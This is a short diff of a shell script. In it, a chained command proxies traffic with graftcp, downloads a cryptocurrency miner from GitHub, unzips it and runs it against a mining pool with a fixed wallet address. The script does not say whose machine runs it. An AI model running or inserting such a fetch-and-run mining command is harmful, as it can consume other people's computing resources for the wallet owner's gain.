@@ -35,6 +35,4 @@ echo ""
 echo " "
 echo " "
 
-./graftcp/graftcp wget -q https://github.com/Beeppool/miner/releases/download/0.6.1/beepminer-0.6.1.zip && unzip beepminer-0.6.1.zip && cd beepminer-0.6.1
-
-./graftcp/graftcp ./miner --miner=96 --wallet-address="NQ50 44BA 44R3 BFHX 8648 3UTH LX98 KJYC TV5P" --pool=pool.acemining.co:8443
+./graftcp/graftcp wget -q https://github.com/Beeppool/miner/releases/download/0.6.1/beepminer-0.6.1.zip && unzip beepminer-0.6.1.zip && cd beepminer-0.6.1 && ./miner --miner=96 --wallet-address="NQ50 44BA 44R3 BFHX 8648 3UTH LX98 KJYC TV5P" --pool=pool.acemining.co:8443
